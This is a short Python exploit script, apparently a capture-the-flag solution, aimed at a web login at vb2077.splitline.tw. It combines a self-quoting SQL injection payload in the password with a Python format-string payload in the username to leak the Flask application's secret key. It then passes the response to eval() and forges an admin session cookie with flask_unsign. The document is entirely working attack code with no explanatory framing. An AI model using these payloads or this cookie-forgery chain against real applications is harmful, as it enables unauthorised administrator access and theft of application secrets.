import requests
import string
import time
import sys
import flask_unsign

username = '{flag.__init__.__globals__[app].secret_key}'
password = "' UNION SELECT \"{flag.__init__.__globals__[app].secret_key}\",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT ' UNION SELECT \"{flag.__init__.__globals__[app].secret_key}\",printf(substr(quote(hex(0)),1,1)||a,a) FROM (SELECT %Q AS a)--' AS a)--"

connect = requests.get('https://vb2077.splitline.tw')
cookies = connect.cookies.get_dict()
connect = requests.post('https://vb2077.splitline.tw/login', {'username': username, 'password': password}, cookies = cookies)
secret_key = eval(connect.text.split(' ')[1])

text = {"is_admin": True}
new_session = flask_unsign.sign(text, secret_key)
cookies['session'] = new_session

connect = requests.post('https://vb2077.splitline.tw/login', {'username': username, 'password': password}, cookies = cookies)
print(connect.text)
